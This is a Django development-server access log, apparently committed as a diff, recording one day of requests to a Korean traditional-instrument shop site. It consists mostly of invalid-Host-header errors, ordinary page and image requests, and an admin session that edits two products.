+Bad Request: /
+[14/Aug/2018 15:07:22] "GET / HTTP/1.1" 400 59356
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 15:52:34] "GET / HTTP/1.1" 400 58769
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 16:15:07] "GET / HTTP/1.1" 400 59093
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 16:18:13] "GET / HTTP/1.1" 400 58775
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 16:21:35] "GET / HTTP/1.1" 400 59165
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 16:38:05] "GET / HTTP/1.1" 400 58777
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 16:53:36] "GET / HTTP/1.1" 400 59713
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /apple-touch-icon-120x120-precomposed.png
+[14/Aug/2018 16:53:36] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 400 59722
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /apple-touch-icon-120x120.png
+[14/Aug/2018 16:53:37] "GET /apple-touch-icon-120x120.png HTTP/1.1" 400 59590
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /apple-touch-icon-precomposed.png
+[14/Aug/2018 16:53:37] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 400 59634
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /apple-touch-icon.png
+[14/Aug/2018 16:53:37] "GET /apple-touch-icon.png HTTP/1.1" 400 59502
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /favicon.ico
+[14/Aug/2018 16:53:37] "GET /favicon.ico HTTP/1.1" 400 59403
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /apple-touch-icon-120x120-precomposed.png
+[14/Aug/2018 16:53:38] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 400 59722
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /apple-touch-icon-120x120.png
+[14/Aug/2018 16:53:38] "GET /apple-touch-icon-120x120.png HTTP/1.1" 400 59590
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /apple-touch-icon-precomposed.png
+[14/Aug/2018 16:53:38] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 400 59634
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /apple-touch-icon.png
+[14/Aug/2018 16:53:38] "GET /apple-touch-icon.png HTTP/1.1" 400 59502
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /favicon.ico
+[14/Aug/2018 16:53:38] "GET /favicon.ico HTTP/1.1" 400 59403
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 17:01:12] "GET / HTTP/1.1" 400 59354
+Not Found: /robots.txt
+[14/Aug/2018 17:04:27] "GET /robots.txt HTTP/1.1" 404 5609
+[14/Aug/2018 17:04:34] "GET /accounts/login/ HTTP/1.1" 200 3095
+[14/Aug/2018 17:04:45] "GET /info/ HTTP/1.1" 200 4233
+[14/Aug/2018 17:05:01] "GET /products/ HTTP/1.1" 200 12020
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 17:36:50] "GET / HTTP/1.1" 400 59026
+[14/Aug/2018 17:41:52] "GET / HTTP/1.1" 200 5787
+[14/Aug/2018 17:42:03] "GET /static/shop/js/javascript.js HTTP/1.1" 200 5130
+[14/Aug/2018 18:33:05] "GET / HTTP/1.1" 200 5787
+[14/Aug/2018 18:33:27] "GET /static/shop/js/javascript.js HTTP/1.1" 200 5130
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 18:36:03] "GET / HTTP/1.1" 400 58770
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 18:49:59] "GET / HTTP/1.1" 400 58768
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 18:51:34] "GET / HTTP/1.1" 400 58768
+[14/Aug/2018 19:28:03] "GET / HTTP/1.1" 200 5787
+[14/Aug/2018 19:28:03] "GET /static/shop/js/javascript.js HTTP/1.1" 200 5130
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 19:55:18] "GET / HTTP/1.1" 400 59339
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/socketserver.py", line 625, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.5/socketserver.py", line 354, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.5/socketserver.py", line 681, in __init__
+    self.handle()
+  File "/usr/local/lib/python3.5/dist-packages/django/core/servers/basehttp.py", line 139, in handle
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.5/socket.py", line 575, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 20:07:16] "GET / HTTP/1.1" 400 59203
+[14/Aug/2018 21:23:09] "GET / HTTP/1.1" 200 5787
+[14/Aug/2018 21:23:09] "GET /static/shop/css/home.css HTTP/1.1" 200 6133
+[14/Aug/2018 21:23:10] "GET /static/shop/js/javascript.js HTTP/1.1" 200 5130
+[14/Aug/2018 21:23:18] "GET / HTTP/1.1" 200 5787
+[14/Aug/2018 21:23:18] "GET /static/shop/css/home.css HTTP/1.1" 200 6133
+[14/Aug/2018 21:23:19] "GET /static/shop/js/javascript.js HTTP/1.1" 200 5130
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 21:25:50] "GET / HTTP/1.1" 400 59354
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 21:39:55] "GET / HTTP/1.1" 400 58775
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 22:26:31] "HEAD / HTTP/1.1" 400 58500
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 22:32:09] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 400 59515
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 22:33:21] "GET / HTTP/1.1" 400 58768
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 22:35:40] "GET / HTTP/1.1" 400 58769
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 22:52:51] "GET / HTTP/1.1" 400 58766
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 22:58:55] "GET / HTTP/1.1" 400 59713
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /apple-touch-icon-120x120-precomposed.png
+[14/Aug/2018 22:58:55] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 400 59722
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /apple-touch-icon-120x120.png
+[14/Aug/2018 22:58:55] "GET /apple-touch-icon-120x120.png HTTP/1.1" 400 59590
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /apple-touch-icon-precomposed.png
+[14/Aug/2018 22:58:55] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 400 59634
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /apple-touch-icon.png
+[14/Aug/2018 22:58:55] "GET /apple-touch-icon.png HTTP/1.1" 400 59502
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /favicon.ico
+[14/Aug/2018 22:58:55] "GET /favicon.ico HTTP/1.1" 400 59403
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /apple-touch-icon-120x120-precomposed.png
+[14/Aug/2018 22:58:55] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 400 59722
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /apple-touch-icon-120x120.png
+[14/Aug/2018 22:58:55] "GET /apple-touch-icon-120x120.png HTTP/1.1" 400 59590
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /apple-touch-icon-precomposed.png
+[14/Aug/2018 22:58:56] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 400 59634
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /apple-touch-icon.png
+[14/Aug/2018 22:58:56] "GET /apple-touch-icon.png HTTP/1.1" 400 59502
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /favicon.ico
+[14/Aug/2018 22:58:56] "GET /favicon.ico HTTP/1.1" 400 59403
+Not Found: /robots.txt
+[14/Aug/2018 23:20:55] "GET /robots.txt HTTP/1.1" 404 5609
+[14/Aug/2018 23:20:57] "GET /accounts/signup/ HTTP/1.1" 200 4804
+[14/Aug/2018 23:20:59] "GET /products/10/ HTTP/1.1" 200 4430
+[14/Aug/2018 23:21:02] "GET /products/11/ HTTP/1.1" 200 4432
+[14/Aug/2018 23:21:05] "GET /products/12/ HTTP/1.1" 200 4432
+[14/Aug/2018 23:21:09] "GET /products/13/ HTTP/1.1" 200 4447
+[14/Aug/2018 23:21:12] "GET /products/14/ HTTP/1.1" 200 4447
+[14/Aug/2018 23:21:15] "GET /products/15/ HTTP/1.1" 200 4417
+[14/Aug/2018 23:21:18] "GET /products/16/ HTTP/1.1" 200 4418
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 23:21:20] "GET / HTTP/1.1" 400 58769
+[14/Aug/2018 23:21:21] "GET /products/17/ HTTP/1.1" 200 4413
+[14/Aug/2018 23:21:25] "GET /products/18/ HTTP/1.1" 200 4418
+[14/Aug/2018 23:21:29] "GET /products/19/ HTTP/1.1" 200 4439
+[14/Aug/2018 23:21:32] "GET /products/20/ HTTP/1.1" 200 4438
+[14/Aug/2018 23:21:35] "GET /products/21/ HTTP/1.1" 200 4420
+[14/Aug/2018 23:21:39] "GET /products/22/ HTTP/1.1" 200 4429
+[14/Aug/2018 23:21:41] "GET /products/23/ HTTP/1.1" 200 4431
+[14/Aug/2018 23:21:43] "GET /products/24/ HTTP/1.1" 200 4461
+[14/Aug/2018 23:21:46] "GET /products/25/ HTTP/1.1" 200 4423
+[14/Aug/2018 23:21:50] "GET /products/26/ HTTP/1.1" 200 4415
+[14/Aug/2018 23:21:53] "GET /products/27/ HTTP/1.1" 200 4365
+[14/Aug/2018 23:21:57] "GET /products/28/ HTTP/1.1" 200 4367
+[14/Aug/2018 23:21:59] "GET /products/29/ HTTP/1.1" 200 4402
+[14/Aug/2018 23:22:02] "GET /products/3/ HTTP/1.1" 200 4456
+[14/Aug/2018 23:22:05] "GET /products/30/ HTTP/1.1" 200 4437
+[14/Aug/2018 23:22:08] "GET /products/4/ HTTP/1.1" 200 4456
+[14/Aug/2018 23:22:12] "GET /products/5/ HTTP/1.1" 200 4462
+[14/Aug/2018 23:22:14] "GET /products/6/ HTTP/1.1" 200 4465
+[14/Aug/2018 23:22:18] "GET /products/7/ HTTP/1.1" 200 4465
+[14/Aug/2018 23:22:21] "GET /products/8/ HTTP/1.1" 200 4465
+[14/Aug/2018 23:22:25] "GET /products/9/ HTTP/1.1" 200 4473
+[14/Aug/2018 23:22:27] "GET /products/Ah/ HTTP/1.1" 200 3168
+[14/Aug/2018 23:22:30] "GET /products/Dae/ HTTP/1.1" 200 2883
+[14/Aug/2018 23:22:32] "GET /products/Ga/ HTTP/1.1" 200 5630
+[14/Aug/2018 23:22:34] "GET /products/Gu/ HTTP/1.1" 200 4425
+[14/Aug/2018 23:22:38] "GET /products/Hae/ HTTP/1.1" 200 3779
+[14/Aug/2018 23:22:41] "GET /products/etc/ HTTP/1.1" 200 6330
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Aug/2018 23:34:32] "GET / HTTP/1.1" 400 58770
+[14/Aug/2018 23:35:15] "GET / HTTP/1.1" 200 5787
+[14/Aug/2018 23:35:21] "GET /static/shop/js/javascript.js HTTP/1.1" 200 5130
+Invalid HTTP_HOST header: 'www.baidu.com'. You may need to add 'www.baidu.com' to ALLOWED_HOSTS.
+Bad Request: /http:/www.baidu.com/cache/global/img/gs.gif
+[14/Aug/2018 23:40:09] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 400 59253
+[14/Aug/2018 23:51:59] "GET / HTTP/1.1" 200 5787
+[14/Aug/2018 23:51:59] "GET /static/shop/css/home.css HTTP/1.1" 200 6133
+[14/Aug/2018 23:51:59] "GET /static/shop/js/javascript.js HTTP/1.1" 200 5130
+[14/Aug/2018 23:51:59] "GET /static/shop/assets/logo.png HTTP/1.1" 200 12947
+[14/Aug/2018 23:51:59] "GET /static/shop/assets/buttonRight.png HTTP/1.1" 200 1949
+[14/Aug/2018 23:51:59] "GET /static/shop/assets/buttonLeft.png HTTP/1.1" 200 1972
+[14/Aug/2018 23:51:59] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%ED%95%B4%EA%B8%88_150.png HTTP/1.1" 200 962166
+[14/Aug/2018 23:51:59] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_18%ED%98%84_%EA%B0%80%EC%95%BC%EA%B8%88_250.png HTTP/1.1" 200 2136101
+[14/Aug/2018 23:51:59] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%ED%95%B4%EA%B8%88_60.png HTTP/1.1" 200 951536
+[14/Aug/2018 23:52:00] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EC%82%B0%EC%A1%B0_%EA%B0%80%EC%95%BC%EA%B8%88_300.png HTTP/1.1" 200 2061638
+[14/Aug/2018 23:52:00] "GET /static/shop/assets/m2_cont_2.png HTTP/1.1" 200 483239
+[14/Aug/2018 23:52:00] "GET /static/shop/assets/m2_cont_1.png HTTP/1.1" 200 461965
+[14/Aug/2018 23:52:00] "GET /static/shop/assets/m2_cont_3.png HTTP/1.1" 200 520911
+[14/Aug/2018 23:52:00] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_25%ED%98%84_%EA%B0%80%EC%95%BC%EA%B8%88_500.png HTTP/1.1" 200 2973646
+[14/Aug/2018 23:52:00] "GET /static/shop/assets/map.png HTTP/1.1" 200 397536
+[14/Aug/2018 23:52:00] "GET /static/shop/assets/banner1.png HTTP/1.1" 200 1429918
+[14/Aug/2018 23:52:00] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EC%96%91%EA%B8%88250.png HTTP/1.1" 200 3326137
+Not Found: /favicon.ico
+[14/Aug/2018 23:52:00] "GET /favicon.ico HTTP/1.1" 404 5619
+[14/Aug/2018 23:52:01] "GET /products/ HTTP/1.1" 200 12020
+[14/Aug/2018 23:52:01] "GET /static/shop/css/product.css HTTP/1.1" 200 1411
+[14/Aug/2018 23:52:01] "GET /static/shop/css/login.css HTTP/1.1" 200 1236
+[14/Aug/2018 23:52:01] "GET /static/shop/css/intro.css HTTP/1.1" 200 2284
+[14/Aug/2018 23:52:02] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EC%82%B0%EC%A1%B0_%EA%B0%80%EC%95%BC%EA%B8%88_500.png HTTP/1.1" 200 2040655
+[14/Aug/2018 23:52:02] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EA%B1%B0%EB%AC%B8%EA%B3%A0300.png HTTP/1.1" 200 2117482
+[14/Aug/2018 23:52:02] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EC%82%B0%EC%A1%B0_%EA%B0%80%EC%95%BC%EA%B8%88_60.png HTTP/1.1" 200 2437000
+[14/Aug/2018 23:52:02] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EC%A0%95%EC%95%85_%EA%B0%80%EC%95%BC%EA%B8%88_300_ASLaGNj.png HTTP/1.1" 200 2667490
+[14/Aug/2018 23:52:02] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EC%A0%95%EC%95%85_%EA%B0%80%EC%95%BC%EA%B8%88_300.png HTTP/1.1" 200 2667490
+[14/Aug/2018 23:52:03] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EA%B1%B0%EB%AC%B8%EA%B3%A0500.png HTTP/1.1" 200 2095051
+[14/Aug/2018 23:52:03] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EA%B1%B0%EB%AC%B8%EA%B3%A0800.png HTTP/1.1" 200 2066120
+[14/Aug/2018 23:52:03] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%ED%95%B4%EA%B8%88_300.png HTTP/1.1" 200 919139
+[14/Aug/2018 23:52:03] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EC%A0%95%EC%95%85_%EC%95%84%EC%9F%81.png HTTP/1.1" 200 2849930
+[14/Aug/2018 23:52:04] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EC%82%B0%EC%A1%B0_%EC%95%84%EC%9F%81.png HTTP/1.1" 200 2833798
+[14/Aug/2018 23:52:04] "GET /media/Products/mainImg/%EA%B1%B0%EB%AC%B8%EA%B3%A0_%EB%AA%85%EC%A3%BC%EC%8B%A430.png HTTP/1.1" 200 3180856
+[14/Aug/2018 23:52:05] "GET /media/Products/mainImg/%EC%95%84%EC%9F%81%EB%AA%85%EC%A3%BC%EC%8B%A4.png HTTP/1.1" 200 4451949
+[14/Aug/2018 23:52:05] "GET /media/Products/mainImg/%EA%B0%80%EC%95%BC%EA%B8%88_%EB%AA%85%EC%A3%BC%EC%8B%A4_30.png HTTP/1.1" 200 5788675
+[14/Aug/2018 23:52:06] "GET /media/Products/mainImg/%EA%B1%B0%EB%AC%B8%EA%B3%A0%EB%B0%9B%EC%B9%A8%EB%8C%8035.png HTTP/1.1" 200 5921526
+[14/Aug/2018 23:52:07] "GET /media/Products/mainImg/%EA%B1%B0%EB%AC%B8%EA%B3%A0_%EC%95%88%EC%A1%B115.png HTTP/1.1" 200 3499459
+[14/Aug/2018 23:52:07] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EC%88%A0%EB%8C%80.png HTTP/1.1" 200 416613
+[14/Aug/2018 23:52:07] "GET /media/Products/mainImg/%EA%B0%80%EC%95%BC%EA%B8%88%EC%95%88%EC%A1%B130%EB%A7%8C.png HTTP/1.1" 200 5278346
+[14/Aug/2018 23:52:08] "GET /media/Products/mainImg/%EA%B3%A8%EB%AC%B4.png HTTP/1.1" 200 6301357
+[14/Aug/2018 23:52:08] "GET /media/Products/mainImg/%EB%8B%A8%EC%86%8C7%EB%A7%8C.png HTTP/1.1" 200 3284899
+[14/Aug/2018 23:52:08] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EB%B3%B4%EB%A9%B4%EB%8C%803%EB%A7%8C5%EC%B2%9C.png HTTP/1.1" 200 3213025
+[14/Aug/2018 23:52:09] "GET /media/Products/mainImg/%EA%B0%80%EC%95%BC%EA%B8%88%EB%B0%9B%EC%B9%A8%EB%8C%80.png HTTP/1.1" 200 13226576
+[14/Aug/2018 23:52:09] "GET /media/Products/mainImg/%EA%B1%B0%EB%AC%B8%EA%B3%A0%EC%95%89%EC%9D%80%EB%B0%9B%EC%B9%A8%EB%8C%80.png HTTP/1.1" 200 13094993
+[14/Aug/2018 23:52:10] "GET /products/Gu/ HTTP/1.1" 200 4425
+[14/Aug/2018 23:52:15] "GET /products/Ah/ HTTP/1.1" 200 3168
+[14/Aug/2018 23:52:16] "GET /products/Hae/ HTTP/1.1" 200 3779
+[14/Aug/2018 23:52:17] "GET /products/Dae/ HTTP/1.1" 200 2883
+[14/Aug/2018 23:52:18] "GET /products/etc/ HTTP/1.1" 200 6330
+[14/Aug/2018 23:52:22] "GET /info/ HTTP/1.1" 200 4233
+[14/Aug/2018 23:52:22] "GET /static/shop/assets/intro1.png HTTP/1.1" 200 487599
+[14/Aug/2018 23:52:22] "GET /static/shop/assets/intro2.png HTTP/1.1" 200 403889
+[14/Aug/2018 23:52:22] "GET /static/shop/assets/intro3.png HTTP/1.1" 200 391894
+[14/Aug/2018 23:52:22] "GET /static/shop/assets/intro4.png HTTP/1.1" 200 494610
+[14/Aug/2018 23:52:26] "GET / HTTP/1.1" 200 5787
+[14/Aug/2018 23:52:32] "GET / HTTP/1.1" 200 5787
+[14/Aug/2018 23:52:32] "GET /static/shop/js/javascript.js HTTP/1.1" 200 5130
+[14/Aug/2018 23:52:35] "GET /admin HTTP/1.1" 301 0
+[14/Aug/2018 23:52:35] "GET /admin/ HTTP/1.1" 302 0
+[14/Aug/2018 23:52:35] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1836
+[14/Aug/2018 23:52:35] "GET /static/admin/css/base.css HTTP/1.1" 200 16225
+[14/Aug/2018 23:52:35] "GET /static/admin/css/login.css HTTP/1.1" 200 1203
+[14/Aug/2018 23:52:35] "GET /static/admin/css/responsive.css HTTP/1.1" 200 17976
+[14/Aug/2018 23:52:35] "GET /static/admin/css/fonts.css HTTP/1.1" 200 423
+[14/Aug/2018 23:52:35] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 80304
+[14/Aug/2018 23:52:35] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 81348
+[14/Aug/2018 23:52:41] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
+[14/Aug/2018 23:52:41] "GET /admin/ HTTP/1.1" 200 7996
+[14/Aug/2018 23:52:41] "GET /static/admin/css/dashboard.css HTTP/1.1" 200 412
+[14/Aug/2018 23:52:41] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 200 380
+[14/Aug/2018 23:52:41] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 200 331
+[14/Aug/2018 23:52:41] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 200 82564
+[14/Aug/2018 23:52:43] "GET /admin/shop/product/ HTTP/1.1" 200 10621
+[14/Aug/2018 23:52:43] "GET /static/admin/css/changelists.css HTTP/1.1" 200 6170
+[14/Aug/2018 23:52:43] "GET /static/admin/js/jquery.init.js HTTP/1.1" 200 363
+[14/Aug/2018 23:52:43] "GET /admin/jsi18n/ HTTP/1.1" 200 8292
+[14/Aug/2018 23:52:43] "GET /static/admin/js/core.js HTTP/1.1" 200 7134
+[14/Aug/2018 23:52:43] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 200 6918
+[14/Aug/2018 23:52:43] "GET /static/admin/js/actions.js HTTP/1.1" 200 6538
+[14/Aug/2018 23:52:43] "GET /static/admin/js/urlify.js HTTP/1.1" 200 8972
+[14/Aug/2018 23:52:43] "GET /static/admin/js/prepopulate.js HTTP/1.1" 200 1530
+[14/Aug/2018 23:52:43] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 200 271751
+[14/Aug/2018 23:52:43] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 200 128820
+[14/Aug/2018 23:52:43] "GET /static/admin/img/tooltag-add.svg HTTP/1.1" 200 331
+[14/Aug/2018 23:52:48] "GET /admin/shop/product/26/change/ HTTP/1.1" 200 11365
+[14/Aug/2018 23:52:48] "GET /admin/jsi18n/ HTTP/1.1" 200 8292
+[14/Aug/2018 23:52:48] "GET /static/admin/css/forms.css HTTP/1.1" 200 8505
+[14/Aug/2018 23:52:48] "GET /static/admin/js/inlines.js HTTP/1.1" 200 13813
+[14/Aug/2018 23:52:48] "GET /static/admin/js/change_form.js HTTP/1.1" 200 712
+[14/Aug/2018 23:52:48] "GET /static/admin/js/prepopulate_init.js HTTP/1.1" 200 495
+[14/Aug/2018 23:52:48] "GET /static/admin/css/widgets.css HTTP/1.1" 200 10340
+[14/Aug/2018 23:52:51] "POST /admin/shop/product/26/change/ HTTP/1.1" 302 0
+[14/Aug/2018 23:52:51] "GET /admin/shop/product/ HTTP/1.1" 200 10825
+[14/Aug/2018 23:52:51] "GET /admin/jsi18n/ HTTP/1.1" 200 8292
+[14/Aug/2018 23:52:51] "GET /static/admin/img/icon-yes.svg HTTP/1.1" 200 436
+[14/Aug/2018 23:52:53] "GET /admin/shop/product/20/change/ HTTP/1.1" 200 11410
+[14/Aug/2018 23:52:53] "GET /admin/jsi18n/ HTTP/1.1" 200 8292
+[14/Aug/2018 23:52:55] "POST /admin/shop/product/20/change/ HTTP/1.1" 302 0
+[14/Aug/2018 23:52:55] "GET /admin/shop/product/ HTTP/1.1" 200 10832
+[14/Aug/2018 23:52:55] "GET /admin/jsi18n/ HTTP/1.1" 200 8292
+[14/Aug/2018 23:52:56] "GET /admin/ HTTP/1.1" 200 8003
+[14/Aug/2018 23:52:59] "GET / HTTP/1.1" 200 6392
+Not Found: /banner2.png
+[14/Aug/2018 23:53:01] "GET /banner2.png HTTP/1.1" 404 5619
+Not Found: /banner1.png
+[14/Aug/2018 23:53:03] "GET /banner1.png HTTP/1.1" 404 5619
+Not Found: /banner2.png
+[14/Aug/2018 23:53:04] "GET /banner2.png HTTP/1.1" 404 5619
+Not Found: /banner1.png
+[14/Aug/2018 23:53:04] "GET /banner1.png HTTP/1.1" 404 5619
+[14/Aug/2018 23:53:26] "GET / HTTP/1.1" 200 6127
+[14/Aug/2018 23:53:26] "GET /static/shop/css/home.css HTTP/1.1" 200 6133
+[14/Aug/2018 23:53:26] "GET /static/shop/assets/buttonLeft.png HTTP/1.1" 200 1972
+[14/Aug/2018 23:53:26] "GET /static/shop/assets/buttonRight.png HTTP/1.1" 200 1949
+[14/Aug/2018 23:53:26] "GET /static/shop/js/javascript.js HTTP/1.1" 200 5130
+[14/Aug/2018 23:53:26] "GET /static/shop/assets/logo.png HTTP/1.1" 200 12947
+[14/Aug/2018 23:53:26] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%ED%95%B4%EA%B8%88_60.png HTTP/1.1" 200 951536
